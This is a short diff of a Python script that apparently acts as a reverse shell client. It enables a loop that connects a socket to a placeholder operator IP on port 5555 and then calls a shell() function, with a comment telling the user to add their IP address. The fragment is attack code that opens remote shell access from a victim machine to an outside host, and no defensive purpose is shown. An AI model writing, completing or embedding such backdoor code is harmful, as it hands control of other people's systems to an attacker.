@@ -24,7 +24,8 @@ def connection():
              while True:
                      time.sleep(20)
                      try:
-# Add your ip address and uncomment this line   s.connect(('ip ', 5555))
+# Add your ip addres
+                              s.connect(('Your ip address ', 5555))
                               shell()
                               s.close()
                               break
